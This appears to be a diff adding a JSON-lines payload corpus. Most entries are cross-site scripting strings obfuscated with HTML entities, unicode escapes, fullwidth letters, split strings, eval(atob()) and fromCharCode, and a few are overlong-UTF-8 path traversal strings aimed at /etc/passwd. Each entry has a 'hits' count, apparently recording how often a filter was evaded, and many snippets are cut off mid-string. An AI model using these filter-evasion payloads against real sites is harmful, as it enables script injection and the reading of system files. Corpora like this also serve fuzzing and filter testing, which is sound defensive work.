+{"label": "XSS", "source": "feedback", "snippet": "e&#118;a&#108;(a&#116;&#111;b('<&#115;&#99;ri&#112;t>aler&#116;(&#49;)</s&#99;r&#105;&#112;t>'))", "hits": 20}
+{"label": "XSS", "source": "feedback", "snippet": "eval&#40;a&#116;&#111;b('<&#115;c&#114;&#105;&#112;&#116;&#62;aler&#116;(1&#41;&#60;/&#115;&#99;r&#105;&#112;t>'&#41;&#4", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;S&#99;&#114;&#105;PT>&#97;l&#101;rT(1)&#60;/sCr&#105;&#112;&#116;&#62;", "hits": 20}
+{"label": "PathTraversal", "source": "feedback", "snippet": "..%c0%af..%c0%af..%c0%afeTc/pASswD", "hits": 160}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;&#1&#49;&#53;;&#38;#&#57;&#57;&#59;&#114;&#105;\\u0070&#116;&&#35;&#54;&#50;&#59;a&#108;\\u0065&#114;&#116;&&#35;40&#", "hits": 4}
+{"label": "XSS", "source": "feedback", "snippet": "&#&#49;0&#49;;&&#35;&#51;&#56;&#59;&#35;11&#56;;&#9&#55;&#59;&&#38;&#35;&#51;5;&#49;&#48;&#&#53;6;&#59;(a&#&#49;&#49;6&#", "hits": 1}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;img src&#61;&#120;&#32;&#111;nerro'+'r&#61;\"<sc&#114;&#105;pt>&#97;l&#101;&#114;&#116;(1)</&#115;cr&#105;p&#116;>\"&", "hits": 58}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;&#105;mg&#32;S&#114;C&&#35;61;&#38;#12&#48;;&&#35;32;&#38;&#35;&#49;&#49;1;n&#101;&#114;RO&#114;&#38;#61&#59;\"<&#11", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#101;&#38;#118;&#97;&&#35;10&#56;;(a&#116;&&#35;11&#49;;b&#40;&#39;<&#&#49;1&#53;;&#9&#57;;&#114;&#105;&&#35;112&#59;&#", "hits": 1}
+{"label": "XSS", "source": "feedback", "snippet": "eval&#40&#59;&#97;&#116;&#111;b('&#60;&#38;&#35;115&#59;c&#&#49;14;&#38;&#35;10&#53;;&#38;#1&#49;&#50;;&#116;&#62&#59;&#", "hits": 0}
+{"label": "PathTraversal", "source": "feedback", "snippet": "..%c0%af..%c0%af..%c0%afｅTc/pASｓwD", "hits": 2}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;i&#109;g&#32;&#115;&#114;c&#61;x on&#101;&#114;&#114;o&#114;=\"&#60;&#115;&#99;r&#105;&#112;t>&#97;l&#101;r&#116;&#4", "hits": 64}
+{"label": "XSS", "source": "feedback", "snippet": "e&#118;al(at&#111;b&#40;&#39;<&#115;&#99;&#114;ip&#116;>&#97;l&#101;r&#116;(1&#41;&#60;&#47;&#115;c&#114;i&#112;t>'&#41;", "hits": 20}
+{"label": "XSS", "source": "feedback", "snippet": "&&&#35;3&#53;&#59;&#54;&#48;&#59;&#38;&#35;&#49;&&#38;&#35;&#51;&#53;&#59;&#52;9&#&#53;9&#59;&&#3&#53;&#59;53;&#38;&#35;", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#38;&#35;&#49;&#48;&#49;&#59;&#38;&#35;&#51;&#56;&#59;&#38;&#35;&#51;&#53;&#59;&#38;&#35;&#52;&#57;&#59;&#38;&#35;&#52;", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;&#1&&#35;&#52;9;&#&#53;3;;&#38;&#35;3&#56;;&#35;&&#35;57;&#5&#55;&#59;&#38;&#35;&#53;9&#59;&#38;#&#49;&#49;&#52;;&#", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&&#35;&#54;&#48;;&#38;&#35;&#49;&#38;#49&#59;&#5&#51;&#59;;&#&#51;8;&#35;&&#35;5&#55;;&#38;#5&#55;;&#59;&#38;&#35;1&#49;", "hits": 1}
+{"label": "XSS", "source": "feedback", "snippet": "&#60&#59;&#38;#38&#59;&&#35;35&#59;&&#35;&#52;&#57;&#59;&#38;#4&#57;&#59;&#38;#5&#51;&#59;&#38;&#35;59&#59;&#38;#&#51;&#", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;\\u0069mg sr\\u0063&#61;&#120;&#32;&#111;\\u006eer\\u0072o'+'r&#61;\"<s\\u0063&#114;&#105;p\\u0074>&#97;\\u006c&#101;&#114;", "hits": 46}
+{"label": "XSS", "source": "feedback", "snippet": "&#6&#48;&#59;&&#35;10&#53;;&#109;g&&#35;3&#50;;s&#38;#1&#49;&#52;;c&&&#35;&#51;5&#59;61;&&#35;3&#56;;#&#49;2&&#35;&#52;8", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60&#59;&&#35;1&#48;5;mg&#&#51;&#50;&#59;s&#38;#11&#52;;&#99;&#38;&#38;&#35;3&#53;&#59;&#54;&#49;;&#38;#3&#56;&#59;#12&", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "e&#38;#118;a&#38;&#35;&#49;0&#56;&#59;&#40;a&#38;&#35;11&#54;&#59;&#&#49;&#49;1;b&#40;&#39;&#60;&&#35;&#49;&#49;&#53;;&#", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "e&#38;#&#49;&#49;&#56;&#59;&#97;&#38;&#35;1&#48;8&#59;&#40;a&#38;&#35;11&#54;;&#11&#49;&#59;b('<&#&#49;15;&#38;#9&#57;;&", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#101;va&#108;&#&#52;&#48;&#59;a&#11&#54;&#59;&&#35;&#49;&#49;%&#48;01&#59;&#98;('<&#38;&#35;&#49;15;c&#1&#49;4;&#38;&#3", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;i&#109;g&#32;&#115;&#114;c&#61;x/**/on&#101;&#114;&#114;o&#114;=\"&#60;&#115;&#99;r&#105;&#112;t>&#97;l&#101;r&#116;", "hits": 23}
+{"label": "XSS", "source": "feedback", "snippet": "&#38;#&#54;0&#59;i&#109&#59;&#103;&&#35;32;&#38;&#35;&#49;&#49;&#53;&#59;&#38;#&#49;14;c&#&#54;1;&#120;&#32;on&#38;&#35;", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;&#115;c&#114;&#105;p&#116;>&#97;&#108;&#101;&#114;t&#40;1&#41;<&#47;&#115;cri&#112;t>", "hits": 12}
+{"label": "XSS", "source": "feedback", "snippet": "e&#118;a&#108;(a&#116;ob&#40;&#39;&#60;sc&#114;ipt&#62;&#97;l&#101;rt(&#49;)&#60;/&#115;cript&#62;'&#41;)", "hits": 16}
+{"label": "XSS", "source": "feedback", "snippet": "id=1&id=<s&#99;ri&#112;&#116;>ale&#114;t&#40;&#49;)</script>", "hits": 1}
+{"label": "XSS", "source": "feedback", "snippet": "&&#35;60&#59;&&#35;1&&#35;&#52;9&#59;&&#35;53;&#59;&&#35;&#51;&#56;;#&#38;#&#53;7;&&#35;&#53;&#55;;&#59;&#11&#52;;&&#35;", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;ｉmg/**/ｓrc&#61;&#120;&#32;&#111;nｅrrｏr&#61;\"<ｓc&#114;&#105;pｔ>&#97;ｌ&#101;&#114;&#116;(1)</&#115;cr&#105;p&#116;>\"&", "hits": 6}
+{"label": "XSS", "source": "feedback", "snippet": "&&#35;60&#59;im&#103;/**/&#115;rc&#&#54;1;&#38;#120&#59;&&#35;3&#50;;&#&#49;1&#49;&#59;ne&#114;ror&#38;#&#54;1;&#34;<s&#", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "id=1&id=<s&#99;ri&#112;&#116;>ale&#114;t&#40;&#49;)</s'+'c'+'r'+'i'+'p'+'t>", "hits": 69}
+{"label": "XSS", "source": "feedback", "snippet": "<img src=x onerror=\"id=1&id=<s&#99;ri&#112;&#116;>ale&#114;t&#40;&#49;)</script>\">", "hits": 59}
+{"label": "XSS", "source": "feedback", "snippet": "<svg/onload=id=1&id=<s&#99;ri&#112;&#116;>ale&#114;t&#40;&#49;)</script>>", "hits": 18}
+{"label": "XSS", "source": "feedback", "snippet": "i&#100;&#61;1&id‌&#61;&#60;s&#38;#99&#59;r​i&&#35;1&#49;2;&#116;>a&#108;e&&#35;1&#49;&#52;;&#116;&#&#52;&#48;;&&#35;49;)", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "ev&#97;l&#38;&#35;40;&#97;&#38;&#35;&#49;1&#54;;&#&#49;&#49;1;b('<&&#35;&#49;15;c&#38;&#35;1&#49;4;&#38;#&#49;0&#53;&#59", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#38;#6&#48;&#59;s&&#35;&#57;9&#59;&&#35;11&#52;;&#105;&#112;t>&#38;&#35;&#57;&#55;;l&#38;&#35;1&#48;1;rt&#40;1&#41;&#60", "hits": 5}
+{"label": "XSS", "source": "feedback", "snippet": "&#6&#48;;s&#38;#99&#59;&#38;&#35;&#49;14;&#38;&#35;10&#53;&#59;pt>&#38;#9&#55;;&#108;&&#35;1&#48;1;r&#116;(1&#41;&&#35;6", "hits": 2}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;s&#9&#57;;r&#105;&#112&#59;&&#35;&#49;1&#54;&#59;>&#97;&#108;e&#&#49;&#49;4&#59;&#116;&&#35;4&#48;&#59;&&#35;&#52;9", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;s&#99;r&#105;&#38;#&#49;1&#50;&#59;&#38;#1&#49;6;>ale&#38;&#35;1&#49;4&#59;&#116;&#40;&#38;&#35;49&#59;)&#60;/sc&#1", "hits": 1}
+{"label": "XSS", "source": "feedback", "snippet": "id=1&id=&#60;ｉmg ｓrc&#61;&#120;&#32;&#111;nｅrrｏr&#61;\"<ｓc&#114;&#105;pｔ>&#97;ｌ&#101;&#114;&#116;(1)</&#115;cr&#105;p&#11", "hits": 1}
+{"label": "XSS", "source": "feedback", "snippet": "&#&#54;0&#59;ｉm&#103; ｓ&#114;c&#6&#49;;&&#35;&#49;&#50;0&#59;&#38;&#35;32;&&#35;1&#49;&#49;;&#110;&#65349;r&#114;ｏ&#114;", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#38;#&#54;0&#59;img&#47;**/&#115;rc&&#35;&#54;&#49;;&#1&#50;0;&#32&#59;&#111&#59;&#110;&#101;r&#114;or&#6&#49;;&#34;<sc", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&&#38;&#35;&#51;5&#59;&#54;0&#&#53;&#57;;im&#103&#59; &&#35;&#49;&#49;5;r&#99;&#38;&#35;&#38;&#35;5&#52;;1;&#&#51;&#56;&", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "<img src=x onerror=\"id=1&id=<s&#99;ri&#112;&#116;>ale&#114;t&#40;&#49;)</s'+'c'+'r'+'i'+'p'+'t>\">", "hits": 24}
+{"label": "XSS", "source": "feedback", "snippet": "<svg/onload=id=1&id=<s&#99;ri&#112;&#116;>ale&#114;t&#40;&#49;)</s'+'c'+'r'+'i'+'p'+'t>>", "hits": 15}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;=x o&#110;er&#114;or&#61;&#34;&#105;d&#61;&#49;&#38;id=<&#115;&#38;#&#57;9;", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;&#105;&#109;&#103; sr&#99;=&#120; onerr&#111;r=\"i&#100;=&#49;&&#105;d&#61;&#60;s&&#35;99;r&#105;&#38;#&#49;&#49;&#5", "hits": 2}
+{"label": "XSS", "source": "feedback", "snippet": "i&#10&#48;;&#61;&#49;&#38;id&#&#54;&#49;&#59;&#38;&#35;6&#48;;s&#38;&#35;&#51;8&#59;#&#57;9&#&#53;9;&#114;&#105;&&#&#51;", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#38;&#35;&#54;&#48;&#59;&#38;&#35;&#49;1&#53;&#59;&#99;&#&#49;14;ip&#116&#59;&#62&#59;&#38;&#35;97;&#108;e&#114;&#116;&", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#101;&#118;&#38;#&#57;7&#59;l&#38;#3&#56;;&&#35;35;4&#48;;&#38;#&#57;&#55;&#59;&#38;#&#51;8;&#35&#59;&&#35;&#52;9;&#49;", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#38;#6&#48;&#59;s&&#35;&#57;9&#59;&&#35;11&#52;;&#105;&#112;\\u0074>&#38;&#35;&#57;&#55;;\\u006c&#38;&#35;1&#48;1;\\u0072t", "hits": 1}
+{"label": "XSS", "source": "feedback", "snippet": "&#6&#38;&#35;48;;s&#38;#&#57;9&#59&#59;&#38;&#35;&#51;8&#59;&#38;#&#51;5;&#38;&#35;4&#57;;14;&#3&#56;&#59;&#35;&#49;&#48", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#105;d=1&&#105;d&#61;<s&#38;#9&#57;&#59;ri&#1&#49;2;&&#35;11&#54;;&#62;&#97;le&#38;&#35;1&#49;4;&#116;&#38;#4&#48;;&#&#", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;s&#&#57;&#&#53;7;;&#114;&#&#49;05;&#1&#49;&#50;&#59;&&#35;&#&#52;9;&#49;&#&#53;4;&#59;>&#97;&#10&#56;;&#101;&#&#&#5", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;ｓ&#99;r&#105;&#38;#&#49;1&#50;&#59;&#38;#1&#49;6;>alｅ&#38;&#35;1&#49;4&#59;&#116;&#40;&#38;&#35;49&#59;)&#60;/ｓc&#1", "hits": 1}
+{"label": "XSS", "source": "feedback", "snippet": "&#38;#&#54;0&#59;s&#38;&#35;&#57;&#57;&#59;&#114;&#105&#59;&&#35;&#51;&#56;&#59;#&#&#52;9;1&#38;#50;&#38;&#35;59;&#&#51;", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;s&&#35;99&#59;ri&#1&#49;2;&#38;#&#49;16&#59;>&#97;&#108;&#101;&&#35;114&#59;&#116;&#38;#&#52;0;&&#35;49;)</scr&#105", "hits": 1}
+{"label": "XSS", "source": "feedback", "snippet": "&#83;tring&#46;&#102;r&#111;mCh&#97;r&#67;&#111;de(6&#48;,115&#44;&#57;9&#44;&#49;14,105&#44;&#49;1&#50;&#44;116&#44;62,", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#38;&#35;&#54;&#48;&#59;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#38;&#35;&#54;&#49;&#59;&#38;&#35;&#49;&#50;&#48;&#59;", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;\\u0069m\\u0067 s\\u0072\\u0063&#61;&#120;&#32;&#111;n\\u0065\\u0072ror&#61;\"<\\u0073c&#114;&#105;\\u0070t>&#97;l&#101;&#11", "hits": 9}
+{"label": "XSS", "source": "feedback", "snippet": "&&#35;6&#48;;i&#109;g s&#114;&#99;&#6&#49;;&#&#49;&#50;&#48;&#59;&#3&#50;;&#38;#&#49;11&#59;n&#101;r&#114;&#111;&#114;&#", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&&#35;6&#48;;&#105;m&#103; src&&#35;6&#49;;&&#35;120;&#38;#&#51;&#50;&#59;&#11&#49;&#59;n&#101;&#114;&#114;&#111;r&&#35;", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;s&#9&#57;;&#114;&#105;&#&#49;&#49;&#50;;&&#35;&#49;16&#59;&#62;a&#108;e&&#35;1&#49;&#52;;t&#38;&#35;4&#48;;&#38;#4&", "hits": 4}
+{"label": "XSS", "source": "feedback", "snippet": "&&#35;6&#48;;&&#35;38;&#38;&#35;35;&#38;#49&#59;&#38;&#35;&#52;9;&&#35;5&#51;;&#38;#5&#57;;&#38;#&#51;&#56;&#59;&#3&#53;", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "id=1&id=&#60;&#1&#49;&#53;;&#38;#&#57;&#57;&#59;&#114;&#105;p&#116;&&#35;&#54;&#50;&#59;a&#108;e&#114;&#116;&&#35;40&#59", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&&#35;6&#48;;&#115;c&#&#49;14&#59;i&#8203;&#112;&&#35;11&#54;&#59;&#&#54;2;&#&#57;&#55;&#59;&#108;‌&#101;​&#114;&#11&#54", "hits": 0}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;scr&#105;pt&#62;a&#108;ert(&#49;)</scr&#105;pt>", "hits": 0}
